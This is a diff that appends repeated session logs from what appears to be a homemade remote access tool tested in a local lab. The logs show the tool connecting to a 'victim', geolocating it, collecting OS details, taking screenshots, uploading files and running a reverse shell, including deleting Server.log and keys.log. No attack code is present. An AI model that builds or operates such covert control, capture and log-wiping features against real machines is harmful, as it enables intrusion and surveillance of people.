@@ -253,3 +253,708 @@ Default path : C:\Users\azerty\Desktop\dist
 2018-12-28 23:58:54,705 - root - Thread-1 -  INFO - The client is being shutted down
 2018-12-28 23:58:55,710 - root - Thread-1 -  INFO - Closing tcp client connexion
 2018-12-28 23:58:57,219 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:01:48,169 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:01:48,170 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:01:48,170 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:01:48,171 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:01:48,176 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:01:48,177 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:01:48,239 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:01:48,284 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:01:48,464 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:01:48,528 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:01:48,555 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop\dist
+2018-12-29 00:01:48,561 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:01:51,673 - root - MainThread -  INFO - Exiting the client
+2018-12-29 00:01:51,680 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:01:52,685 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:01:54,199 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:02:23,779 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:02:23,780 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:02:23,780 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:02:23,780 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:02:23,785 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:02:23,786 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:02:23,846 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:02:23,852 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:02:24,041 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:02:24,088 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:02:24,100 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop\dist
+2018-12-29 00:02:24,106 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:02:27,420 - root - MainThread -  INFO - Taking a screenshot
+2018-12-29 00:02:27,458 - root - MainThread -  INFO - Downloading the screenshot
+2018-12-29 00:02:34,377 - root - MainThread -  INFO - Download sucessful
+2018-12-29 00:02:39,436 - root - MainThread -  INFO - Showing os infos
+2018-12-29 00:02:41,309 - root - MainThread -  INFO - Entering to the reverse shell
+2018-12-29 00:02:44,019 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:02:45,741 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:02:47,350 - root - MainThread -  INFO - Reverse shell # command > homr
+2018-12-29 00:02:49,086 - root - MainThread -  INFO - Reverse shell # command > home
+2018-12-29 00:02:58,476 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:03:08,816 - root - MainThread -  INFO - Reverse shell # command > upload Server.log
+2018-12-29 00:03:08,840 - root - MainThread -  INFO - Trying to upload Server.log
+2018-12-29 00:03:09,215 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:03:15,317 - root - MainThread -  INFO - Reverse shell # command > cat server.log
+2018-12-29 00:03:27,546 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:03:29,617 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:03:31,440 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:03:46,706 - root - MainThread -  INFO - Reverse shell # command > clear
+2018-12-29 00:03:50,205 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:03:52,297 - root - MainThread -  INFO - Exiting the client
+2018-12-29 00:03:52,307 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:03:53,311 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:03:54,820 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:04:04,201 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:04:04,202 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:04:04,203 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:04:04,203 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:04:04,211 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:04:04,211 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:04:04,287 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:04:04,293 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:04:04,506 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:04:04,554 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:04:04,568 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop
+2018-12-29 00:04:04,574 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:04:08,486 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:04:15,529 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:04:25,463 - root - MainThread -  INFO - Reverse shell # command > upload Server.log
+2018-12-29 00:04:25,489 - root - MainThread -  INFO - Trying to upload Server.log
+2018-12-29 00:04:25,831 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:04:31,864 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:04:45,653 - root - MainThread -  INFO - Reverse shell # command > $type Server.log
+2018-12-29 00:05:03,858 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:05:05,130 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:05:10,644 - root - MainThread -  INFO - Reverse shell # command > 
+2018-12-29 00:05:10,846 - root - MainThread -  INFO - Reverse shell # command > 
+2018-12-29 00:05:11,352 - root - MainThread -  INFO - Reverse shell # command > 
+2018-12-29 00:05:11,532 - root - MainThread -  INFO - Reverse shell # command > 
+2018-12-29 00:05:11,712 - root - MainThread -  INFO - Reverse shell # command > 
+2018-12-29 00:05:16,608 - root - MainThread -  INFO - Reverse shell # command > type
+2018-12-29 00:05:21,893 - root - MainThread -  INFO - Reverse shell # command > type Server.log
+2018-12-29 00:05:47,892 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:05:49,591 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:05:50,598 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:05:51,551 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:05:52,380 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:05:53,844 - root - MainThread -  INFO - Reverse shell # command > cd :
+2018-12-29 00:05:55,184 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:05:56,240 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:10:22,260 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:10:35,840 - root - MainThread -  INFO - Exiting the client
+2018-12-29 00:10:35,846 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:10:36,848 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:10:38,358 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:10:39,573 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:10:39,574 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:10:39,575 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:10:39,575 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:10:39,579 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:10:39,580 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:10:39,642 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:10:39,660 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:10:39,847 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:10:39,894 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:10:39,924 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop\dist
+2018-12-29 00:10:39,931 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:19:08,194 - root - MainThread -  INFO - Exiting the client
+2018-12-29 00:19:08,201 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:19:09,205 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:19:10,718 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:19:14,150 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:19:14,150 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:19:14,151 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:19:14,151 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:19:14,158 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:19:14,159 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:19:14,241 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:19:14,259 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:19:14,460 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:19:14,498 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:19:14,516 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\
+2018-12-29 00:19:14,521 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:19:16,135 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:19:23,684 - root - MainThread -  INFO - Reverse shell # command > home
+2018-12-29 00:19:37,972 - root - MainThread -  INFO - Reverse shell # command > cd %userprofile%
+2018-12-29 00:19:45,307 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:19:58,107 - root - MainThread -  INFO - Reverse shell # command > dir Windows
+2018-12-29 00:20:04,230 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:20:06,277 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:20:08,561 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:20:40,398 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:20:43,087 - root - MainThread -  INFO - Exiting the client & server
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:20:53,558 - root - MainThread -  INFO - Credentials from argpars -> ip : localhost | port : 6970
+2018-12-29 00:20:53,559 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:20:53,559 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:20:53,562 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:20:53,569 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:20:53,570 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:20:53,577 - root - MainThread -  INFO - The victim is connected with the following ip : 127.0.0.1
+2018-12-29 00:20:53,583 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:20:53,784 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:20:53,821 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:20:53,827 - root - MainThread -  INFO - Os victim infos ↴
+Nom : posix
+Systeme : Darwin
+Kernel : 18.2.0
+User : juliandotreppe
+Default path : /Users/juliandotreppe/Desktop/hack_tools
+2018-12-29 00:20:53,833 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:20:56,903 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:21:00,134 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:21:01,221 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:21:06,145 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:21:06,847 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:21:24,578 - root - MainThread -  INFO - Reverse shell # command > ls tmp
+2018-12-29 00:21:31,250 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:21:37,288 - root - MainThread -  INFO - Reverse shell # command > ls Applications
+2018-12-29 00:21:52,243 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:22:04,584 - root - MainThread -  INFO - Reverse shell # command > home
+2018-12-29 00:22:05,552 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:22:10,749 - root - MainThread -  INFO - Reverse shell # command > cat Sever.log
+2018-12-29 00:22:18,500 - root - MainThread -  INFO - Reverse shell # command > cat Server.log
+2018-12-29 00:22:22,899 - root - MainThread -  INFO - Reverse shell # command > ls
+2018-12-29 00:23:27,475 - root - MainThread -  INFO - Reverse shell # command > cat Server.log
+2018-12-29 00:23:53,315 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:23:55,657 - root - MainThread -  INFO - Exiting the client & server
+2018-12-29 00:23:55,670 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:23:56,674 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:23:58,185 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:24:04,080 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:24:04,081 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:24:04,081 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:24:04,082 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:24:04,086 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:24:04,087 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:24:04,160 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:24:04,166 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:24:04,374 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:24:04,423 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:24:04,435 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop\dist
+2018-12-29 00:24:04,441 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:24:07,005 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:24:11,012 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:24:16,132 - root - MainThread -  INFO - Reverse shell # command > cd ..
+2018-12-29 00:24:17,807 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:24:29,318 - root - MainThread -  INFO - Reverse shell # command > type Server.log
+2018-12-29 00:24:37,361 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:24:41,061 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:24:44,751 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:24:48,581 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:26:44,528 - root - MainThread -  INFO - Reverse shell # command > qit$
+2018-12-29 00:26:45,636 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:26:47,571 - root - MainThread -  INFO - Exiting the client & server
+2018-12-29 00:26:47,585 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:26:48,589 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:26:50,098 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:27:01,156 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:27:01,156 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:27:01,157 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:27:01,157 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:27:01,163 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:27:01,164 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:27:01,247 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:27:01,282 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:27:01,507 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:27:01,558 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:27:01,570 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop
+2018-12-29 00:27:01,576 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:27:06,989 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:27:09,825 - root - MainThread -  INFO - Reverse shell # command > dir$
+2018-12-29 00:27:11,534 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:27:17,711 - root - MainThread -  INFO - Reverse shell # command > type Server.log
+2018-12-29 00:27:25,394 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:27:27,161 - root - MainThread -  INFO - Reverse shell # command > quit
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:31:38,819 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:31:38,819 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:31:38,820 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:31:38,820 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:31:38,826 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:31:38,826 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:31:38,882 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:31:38,911 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:31:39,111 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:31:39,150 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:31:39,163 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop
+2018-12-29 00:31:39,170 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:31:41,801 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:31:51,201 - root - MainThread -  INFO - Reverse shell # command > type Server.log
+2018-12-29 00:31:54,970 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:31:56,478 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:31:58,750 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:32:01,269 - root - MainThread -  INFO - Reverse shell # command > cd /
+2018-12-29 00:34:13,639 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:34:16,136 - root - MainThread -  INFO - Exiting the client & server
+2018-12-29 00:34:16,161 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:34:17,164 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:34:18,674 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:34:27,516 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:34:27,516 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:34:27,516 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:34:27,517 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:34:27,521 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:34:27,522 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:34:27,580 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:34:27,632 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:34:27,865 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:34:27,937 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:34:27,956 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop
+2018-12-29 00:34:27,961 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:34:37,624 - root - MainThread -  INFO - Taking a screenshot
+2018-12-29 00:34:37,644 - root - MainThread -  INFO - Downloading the screenshot
+2018-12-29 00:34:44,676 - root - MainThread -  INFO - Download sucessful
+2018-12-29 00:34:50,281 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:34:52,507 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:34:59,585 - root - MainThread -  INFO - Reverse shell # command > type Server.log
+2018-12-29 00:35:08,539 - root - MainThread -  INFO - Reverse shell # command > clear
+2018-12-29 00:35:20,769 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:36:07,513 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:36:11,392 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:36:31,172 - root - MainThread -  INFO - Reverse shell # command > rm Server.log
+2018-12-29 00:36:37,585 - root - MainThread -  INFO - Reverse shell # command > del Server.log
+2018-12-29 00:37:11,784 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:37:14,069 - root - MainThread -  INFO - Entering to the reverse shell
+2018-12-29 00:37:17,207 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:37:18,350 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:37:20,875 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:37:30,854 - root - MainThread -  INFO - Reverse shell # command > del Server.log
+2018-12-29 00:37:48,172 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:37:51,588 - root - MainThread -  INFO - Exiting the client & server
+2018-12-29 00:37:51,607 - root - Thread-1 -  INFO - The client is being shutted down
+2018-12-29 00:37:52,611 - root - Thread-1 -  INFO - Closing tcp client connexion
+2018-12-29 00:37:54,120 - root - MainThread -  INFO - Closing tcp server connexion
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:38:16,345 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:38:16,346 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:38:16,346 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:38:16,347 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:38:16,352 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:38:16,352 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:38:16,420 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:38:16,432 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:38:16,641 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:38:16,678 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:38:16,691 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop
+2018-12-29 00:38:16,697 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:38:20,970 - root - MainThread -  INFO - Taking a screenshot
+2018-12-29 00:38:20,996 - root - MainThread -  INFO - Downloading the screenshot
+2018-12-29 00:38:27,968 - root - MainThread -  INFO - Download sucessful
+2018-12-29 00:38:31,857 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:38:34,069 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:38:38,006 - root - MainThread -  INFO - Reverse shell # command > del Server.log
+2018-12-29 00:39:41,637 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:39:44,776 - root - MainThread -  INFO - Exiting the client & server
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:39:55,660 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:39:55,660 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:39:55,660 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:39:55,661 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:39:55,667 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:39:55,668 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:39:55,740 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:39:55,746 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:39:55,948 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:39:55,998 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:39:56,011 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop
+2018-12-29 00:39:56,016 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:39:59,817 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:40:05,442 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:40:06,285 - root - MainThread -  INFO - Taking a screenshot
+2018-12-29 00:40:06,303 - root - MainThread -  INFO - Downloading the screenshot
+2018-12-29 00:40:15,399 - root - MainThread -  INFO - Download sucessful
+2018-12-29 00:40:25,058 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:40:27,525 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:40:30,823 - root - MainThread -  INFO - Reverse shell # command > del Server.log
+2018-12-29 00:40:37,921 - root - MainThread -  INFO - Reverse shell # command > del keys.log
+2018-12-29 00:44:43,206 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:44:45,694 - root - MainThread -  INFO - Exiting the client & server
+
+
+----------------------------------------------------------------------------------------------------
+
+
+2018-12-29 00:44:53,436 - root - MainThread -  INFO - Credentials from argpars -> ip : 10.0.1.11 | port : 6970
+2018-12-29 00:44:53,437 - root - MainThread -  INFO - Starting Client Thread
+2018-12-29 00:44:53,437 - root - MainThread -  INFO - Waiting for the victim to connect on our server
+2018-12-29 00:44:53,438 - root - Thread-1 -  INFO - Connected to victim's server
+2018-12-29 00:44:53,442 - root - Thread-1 -  INFO - Victim is online
+2018-12-29 00:44:53,443 - root - Thread-1 -  INFO - Waking up victim's client to connect on the server
+2018-12-29 00:44:53,500 - root - MainThread -  INFO - The victim is connected with the following ip : 10.0.1.11
+2018-12-29 00:44:53,518 - root - MainThread -  INFO - Trying to geolocating the victim
+2018-12-29 00:44:53,841 - root - MainThread -  INFO - Victim is connected from : local
+2018-12-29 00:44:53,889 - root - MainThread -  INFO - Getting os victim infos
+2018-12-29 00:44:53,901 - root - MainThread -  INFO - Os victim infos ↴
+Nom : nt
+Systeme : Windows
+Kernel : 10
+User : azerty
+Default path : C:\Users\azerty\Desktop
+2018-12-29 00:44:53,908 - root - MainThread -  INFO - Entering in the main loop
+2018-12-29 00:44:58,057 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:45:04,032 - root - MainThread -  INFO - Reverse shell # command > del Server.log
+2018-12-29 00:45:20,604 - root - MainThread -  INFO - Reverse shell # command > upload ?
+2018-12-29 00:45:25,452 - root - MainThread -  INFO - Reverse shell # command > upload Server.log
+2018-12-29 00:45:25,507 - root - MainThread -  INFO - Trying to upload Server.log
+2018-12-29 00:45:26,146 - root - MainThread -  INFO - Upload sucessful
+2018-12-29 00:45:33,630 - root - MainThread -  INFO - Reverse shell # command > tyê Server.log
+2018-12-29 00:45:38,818 - root - MainThread -  INFO - Reverse shell # command > quit
+2018-12-29 00:45:40,674 - root - MainThread -  INFO - Entering to the expert mode
+2018-12-29 00:45:45,703 - root - MainThread -  INFO - Reverse shell # command > dir
+2018-12-29 00:45:53,633 - root - MainThread -  INFO - Reverse shell # command > type Server.log
